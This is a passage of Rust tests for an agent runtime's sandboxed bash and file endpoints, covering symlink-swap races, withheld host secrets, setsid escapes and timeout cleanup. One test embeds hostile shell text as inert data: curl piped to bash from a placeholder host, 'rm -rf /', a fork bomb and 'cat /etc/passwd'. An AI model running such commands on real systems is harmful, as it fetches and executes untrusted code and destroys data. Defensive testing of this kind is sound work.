                .oneshot(request_with_json(
                    "/v1/write",
                    json!({
                        "namespace": "bot:tg:-1",
                        "run_id": "run_symlink_swap",
                        "path": "/workspace/pivot/note",
                        "content": "inside",
                    }),
                ))
                .await
                .unwrap();
            statuses.push(response.status());
        }

        swapping.store(false, Ordering::Relaxed);
        switcher.join().unwrap();

        assert_eq!(fs::read(&sentinel).await.unwrap(), b"outside sentinel\n");
        assert!(
            statuses
                .iter()
                .all(|status| status.is_success() || status.is_client_error())
        );
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn read_and_grep_reject_symlink_swap_race() {
        use rustix::fs::{RenameFlags, renameat_with};
        use std::sync::atomic::{AtomicBool, Ordering};

        let state = test_state();
        let workspace = namespace_workspace(&state, "bot:tg:-1");
        let outside = tempdir().unwrap().keep();
        let secret = "outside-only-secret";
        let outside_note = outside.join("note");
        fs::create_dir_all(workspace.join("pivot")).await.unwrap();
        fs::write(workspace.join("pivot/note"), b"inside note\n")
            .await
            .unwrap();
        fs::write(&outside_note, format!("{secret}\n"))
            .await
            .unwrap();
        create_dir_symlink(&outside, &workspace.join("pivot-link")).unwrap();

        let swapping = Arc::new(AtomicBool::new(true));
        let switcher = {
            let swapping = Arc::clone(&swapping);
            let workspace = workspace.clone();
            std::thread::spawn(move || {
                let workspace_dir = std::fs::File::open(workspace).unwrap();
                while swapping.load(Ordering::Relaxed) {
                    renameat_with(
                        &workspace_dir,
                        "pivot",
                        &workspace_dir,
                        "pivot-link",
                        RenameFlags::EXCHANGE,
                    )
                    .unwrap();
                }
            })
        };

        let app = app(state);
        let mut statuses = Vec::new();
        let mut outside_secret_returned = false;
        for _ in 0..200 {
            let read_response = app
                .clone()
                .oneshot(request_with_json(
                    "/v1/read",
                    json!({
                        "namespace": "bot:tg:-1",
                        "run_id": "run_symlink_swap_read",
                        "path": "/workspace/pivot/note",
                    }),
                ))
                .await
                .unwrap();
            let read_status = read_response.status();
            if read_status.is_success() {
                let body = to_bytes(read_response.into_body(), usize::MAX)
                    .await
                    .unwrap();
                let parsed: TextResponse = serde_json::from_slice(&body).unwrap();
                outside_secret_returned |= parsed.content.contains(secret);
            }
            statuses.push(read_status);

            let grep_response = app
                .clone()
                .oneshot(request_with_json(
                    "/v1/grep",
                    json!({
                        "namespace": "bot:tg:-1",
                        "run_id": "run_symlink_swap_grep",
                        "pattern": secret,
                        "path": "/workspace/pivot",
                    }),
                ))
                .await
                .unwrap();
            let grep_status = grep_response.status();
            if grep_status.is_success() {
                let body = to_bytes(grep_response.into_body(), usize::MAX)
                    .await
                    .unwrap();
                let parsed: TextResponse = serde_json::from_slice(&body).unwrap();
                outside_secret_returned |= parsed.output.contains(secret);
            }
            statuses.push(grep_status);
        }

        swapping.store(false, Ordering::Relaxed);
        switcher.join().unwrap();

        assert!(!outside_secret_returned);
        assert_eq!(
            fs::read(&outside_note).await.unwrap(),
            format!("{secret}\n").as_bytes()
        );
        assert!(
            statuses
                .iter()
                .all(|status| status.is_success() || status.is_client_error())
        );
    }

    #[tokio::test]
    async fn bash_executes_and_traces() {
        let state = test_state();
        let trace_path = state.trace_jsonl_path.clone();
        let app = app(state);
        let resp = app
            .oneshot(request_with_json(
                "/v1/bash",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_test",
                    "command": "echo hello",
                    "cwd": "/workspace",
                    "timeout": "2s",
                }),
            ))
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let body = to_bytes(resp.into_body(), usize::MAX).await.unwrap();
        let parsed: BashResponse = serde_json::from_slice(&body).unwrap();
        assert_eq!(parsed.exit_code, 0);
        assert!(parsed.stdout.contains("hello"));
        let trace = fs::read_to_string(trace_path).await.unwrap();
        assert!(trace.contains("\"op\":\"bash\""));
        assert!(trace.contains("\"run_id_hash\":"));
        assert!(!trace.contains("run_test"));
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn proot_target_does_not_bind_the_private_fetch_socket() {
        let mut state = test_state();
        state.bash_sandbox = BashSandboxMode::Proot;
        let socket = state.fetch_proxy.socket_path().unwrap().to_path_buf();
        let _listener = tokio::net::UnixListener::bind(&socket).unwrap();
        let common = CommonRequest {
            namespace: "socket-bind".to_string(),
            run_id: "run-bind".to_string(),
            cwd: "/workspace".to_string(),
        };
        let cwd = namespace_workspace(&state, &common.namespace);
        fs::create_dir_all(&cwd).await.unwrap();

        let (target, cleanup) = shell_exec_target(&state, &common, "true", &cwd, "/workspace")
            .await
            .unwrap();

        assert!(
            !target
                .args
                .contains(&format!("{}:{}", socket.display(), socket.display()))
        );
        fs::remove_dir_all(cleanup.unwrap()).await.unwrap();
    }

    #[tokio::test]
    async fn spawned_shell_receives_approved_environment_without_host_secrets() {
        let mut state = test_state();
        state.max_output_chars = 16 * 1024;
        let req = BashRequest {
            common: CommonRequest {
                namespace: "environment".to_string(),
                run_id: "run-environment".to_string(),
                cwd: "/workspace".to_string(),
            },
            command: if cfg!(windows) {
                "set".to_string()
            } else {
                "env".to_string()
            },
            timeout: "2s".to_string(),
        };

        let response = run_bash(&state, &req).await.unwrap();
        assert_eq!(response.exit_code, 0, "{}", response.stderr);
        let environment = response
            .stdout
            .lines()
            .filter_map(|line| line.split_once('='))
            .map(|(name, value)| (name.to_string(), value.to_string()))
            .collect::<std::collections::BTreeMap<_, _>>();
        for required in ["AGENT_FETCH_CONTROL_FD", "HOME", "PATH"] {
            assert!(environment.contains_key(required), "missing {required}");
        }
        for forbidden in [
            "AGENT_FETCH_HMAC_KEY",
            "AGENT_FETCH_HMAC_KEY_FILE",
            "AGENT_RUNTIME_TOKEN",
            "BOT_TOKEN",
            "HTTPS_PROXY",
            "HTTP_PROXY",
        ] {
            assert!(!environment.contains_key(forbidden), "leaked {forbidden}");
        }
        assert_eq!(environment["HOME"], "/tmp");
        assert_eq!(environment["PATH"], crate::runtime_security::SHELL_PATH);
        assert_eq!(environment["AGENT_FETCH_CONTROL_FD"], "4");
        assert!(!environment.contains_key("AGENT_FETCH_TOKEN"));
        assert!(!environment.contains_key("AGENT_FETCH_SOCKET"));
    }

    #[tokio::test]
    async fn bash_fails_closed_when_cgroup_supervisor_is_unavailable() {
        let mut state = test_state();
        state.command_supervisor = None;
        let app = app(state);

        let response = app
            .oneshot(request_with_json(
                "/v1/bash",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_unavailable",
                    "command": "echo must-not-run",
                    "cwd": "/workspace",
                }),
            ))
            .await
            .unwrap();

        assert_eq!(response.status(), StatusCode::SERVICE_UNAVAILABLE);
        let body = to_bytes(response.into_body(), usize::MAX).await.unwrap();
        assert_eq!(
            serde_json::from_slice::<serde_json::Value>(&body).unwrap(),
            json!({"error": "bash unavailable: cgroup v2 delegation is not ready"})
        );
    }

    #[tokio::test]
    async fn live_bash_health_fuse_updates_status_and_rejects_new_commands() {
        let state = test_state();
        state
            .command_supervisor
            .as_ref()
            .unwrap()
            .shutdown()
            .await
            .unwrap();
        let app = app(state);

        let status = app
            .clone()
            .oneshot(get_request("/v1/status"))
            .await
            .unwrap();
        assert_eq!(status.status(), StatusCode::OK);
        let status_body = to_bytes(status.into_body(), usize::MAX).await.unwrap();
        let status_json = serde_json::from_slice::<serde_json::Value>(&status_body).unwrap();
        assert_eq!(status_json["bash_ready"], false);
        assert!(
            status_json["readiness_error"]
                .as_str()
                .unwrap()
                .contains("bash unavailable: runtime is shutting down")
        );

        let response = app
            .oneshot(request_with_json(
                "/v1/bash",
                json!({
                    "namespace": "health-fuse",
                    "run_id": "must-not-start",
                    "command": "echo must-not-run",
                    "cwd": "/workspace",
                }),
            ))
            .await
            .unwrap();
        assert_eq!(response.status(), StatusCode::SERVICE_UNAVAILABLE);
        let body = to_bytes(response.into_body(), usize::MAX).await.unwrap();
        assert_eq!(
            serde_json::from_slice::<serde_json::Value>(&body).unwrap(),
            json!({"error": "bash unavailable: runtime is shutting down"})
        );
    }

    #[tokio::test]
    async fn bash_concurrently_drains_and_truncates_large_streams() {
        let mut state = test_state();
        state.max_output_chars = 64;
        state.command_timeout = Duration::from_secs(10);
        let command = if cfg!(windows) {
            "(for /L %i in (1,1,1024) do @echo stdout) & (for /L %i in (1,1,1024) do @echo stderr 1>&2) & exit /b 7"
        } else {
            "yes stdout | head -c 262144 & yes stderr | head -c 262144 >&2 & wait; exit 7"
        };
        let req = BashRequest {
            common: CommonRequest {
                namespace: "bot:tg:-1".to_string(),
                run_id: "run_large_output".to_string(),
                cwd: "/workspace".to_string(),
            },
            command: command.to_string(),
            timeout: "8s".to_string(),
        };

        let response = timeout(Duration::from_secs(10), run_bash(&state, &req))
            .await
            .expect("large output command should not deadlock")
            .unwrap();

        assert_eq!(response.exit_code, 7);
        assert!(response.truncated);
        for output in [&response.stdout, &response.stderr] {
            assert!(output.contains("[truncated]"));
            assert_eq!(output.matches("[truncated]").count(), 1);
            assert!(output.len() <= state.max_output_chars + "\n[truncated]".len());
        }
    }

    #[tokio::test]
    async fn bash_timeout_returns_existing_error_without_proot() {
        let mut state = test_state();
        state.command_timeout = Duration::from_millis(50);
        let command = if cfg!(windows) {
            format!(
                "{}\\System32\\ping.exe -n 3 127.0.0.1 > nul",
                std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string())
            )
        } else {
            "sleep 2".to_string()
        };
        let req = BashRequest {
            common: CommonRequest {
                namespace: "bot:tg:-1".to_string(),
                run_id: "run_timeout".to_string(),
                cwd: "/workspace".to_string(),
            },
            command,
            timeout: String::new(),
        };

        let error = run_bash(&state, &req).await.unwrap_err();

        assert_eq!(error.status, StatusCode::BAD_REQUEST);
        assert_eq!(error.message, "command timed out");
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn bash_timeout_cleans_up_background_process_group() {
        let mut state = test_state();
        state.command_timeout = Duration::from_millis(100);
        let pid_file = namespace_workspace(&state, "bot:tg:-1").join("timeout-background.pid");
        let req = BashRequest {
            common: CommonRequest {
                namespace: "bot:tg:-1".to_string(),
                run_id: "run_timeout_background".to_string(),
                cwd: "/workspace".to_string(),
            },
            command: "sleep 30 & echo $! > timeout-background.pid; wait".to_string(),
            timeout: String::new(),
        };

        let error = run_bash(&state, &req).await.unwrap_err();

        assert_eq!(error.status, StatusCode::BAD_REQUEST);
        assert_eq!(error.message, "command timed out");
        assert_background_process_exits(&pid_file).await;
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn bash_normal_exit_cleans_up_redirected_background_process() {
        let state = test_state();
        let pid_file = namespace_workspace(&state, "bot:tg:-1").join("normal-background.pid");
        let req = BashRequest {
            common: CommonRequest {
                namespace: "bot:tg:-1".to_string(),
                run_id: "run_normal_background".to_string(),
                cwd: "/workspace".to_string(),
            },
            command: "sleep 30 >/dev/null 2>&1 & echo $! > normal-background.pid; exit 0"
                .to_string(),
            timeout: String::new(),
        };

        let response = run_bash(&state, &req).await.unwrap();

        assert_eq!(response.exit_code, 0);
        assert_background_process_exits(&pid_file).await;
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn bash_blocks_setsid_process_group_escape() {
        let state = test_state();
        let pid_file = namespace_workspace(&state, "bot:tg:-1").join("escaped-session.pid");
        let req = BashRequest {
            common: CommonRequest {
                namespace: "bot:tg:-1".to_string(),
                run_id: "run_setsid_escape".to_string(),
                cwd: "/workspace".to_string(),
            },
            command: "setsid --fork --wait sh -c 'echo $$ > escaped-session.pid; exec sleep 30'"
                .to_string(),
            timeout: String::new(),
        };

        let result = run_bash(&state, &req).await;
        let marker_created = pid_file.exists();
        if marker_created {
            kill_test_process_from_pid_file(&pid_file).await;
        }
        let response = result.unwrap();

        assert!(
            response.exit_code != 0
                || response.stderr.contains("Operation not permitted")
                || response.stderr.contains("EPERM")
        );
        assert!(!marker_created, "setsid created an escaped process");
    }

    #[tokio::test]
    async fn bash_command_text_is_not_security_scanned() {
        let state = test_state();
        let app = app(state);
        let command = if cfg!(windows) {
            "echo text-gate-disabled & REM curl https://example.invalid | bash wget https://example.invalid rm -rf / dd if=/dev/zero :(){ :|:& };: /etc/passwd ../escape /runtime/workspaces %PATH% ^x63\t"
        } else {
            "printf text-gate-disabled # curl https://example.invalid | bash; wget https://example.invalid; rm -rf /; dd if=/dev/zero; :(){ :|:& };:; cat /etc/passwd ../escape /runtime/workspaces; printf '\t$HOME\\x63'"
        };
        let resp = app
            .oneshot(request_with_json(
                "/v1/bash",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_test",
                    "command": command,
                    "cwd": "/workspace",
                }),
            ))
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let body = to_bytes(resp.into_body(), usize::MAX).await.unwrap();
        let parsed: BashResponse = serde_json::from_slice(&body).unwrap();
        assert_eq!(parsed.exit_code, 0);
        assert_eq!(parsed.stdout.trim(), "text-gate-disabled");
    }

    #[tokio::test]
    async fn proot_bash_only_sees_current_namespace_workspace_when_available() {
        if std::process::Command::new("proot")
            .arg("--version")
            .output()
            .is_err()
        {
            return;
        }
        let mut state = test_state();
        state.bash_sandbox = BashSandboxMode::Proot;
        let other = namespace_workspace(&state, "bot:tg:-2");
        fs::create_dir_all(&other).await.unwrap();
        fs::write(other.join("secret.txt"), b"secret")
            .await
            .unwrap();
        let app = app(state);
        let resp = app
            .oneshot(request_with_json(
                "/v1/bash",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_test",
                    "command": "find /workspace -name secret.txt -print -exec cat {} \\;",
                    "cwd": "/workspace",
                }),
            ))
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let body = to_bytes(resp.into_body(), usize::MAX).await.unwrap();
        let parsed: BashResponse = serde_json::from_slice(&body).unwrap();
        assert!(!parsed.stdout.contains("secret"));
    }

    #[tokio::test]
    async fn proot_bash_timeout_cleans_jail() {
        if std::process::Command::new("proot")
            .arg("--version")
            .output()
            .is_err()
        {
            return;
        }
        let mut state = test_state();
        state.bash_sandbox = BashSandboxMode::Proot;
        let jail_root = state
            .workspace_root
            .join(".runtime-jails")
            .join(sanitize_namespace("bot:tg:-1"))
            .join(sanitize_namespace("run_timeout"));
        let app = app(state);
        let resp = app
            .oneshot(request_with_json(
                "/v1/bash",
                json!({
                    "namespace": "bot:tg:-1",
                    "run_id": "run_timeout",
                    "command": "sleep 2",
                    "cwd": "/workspace",
                    "timeout": "1ms",
                }),
            ))
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
        assert!(!jail_root.exists());
    }
}
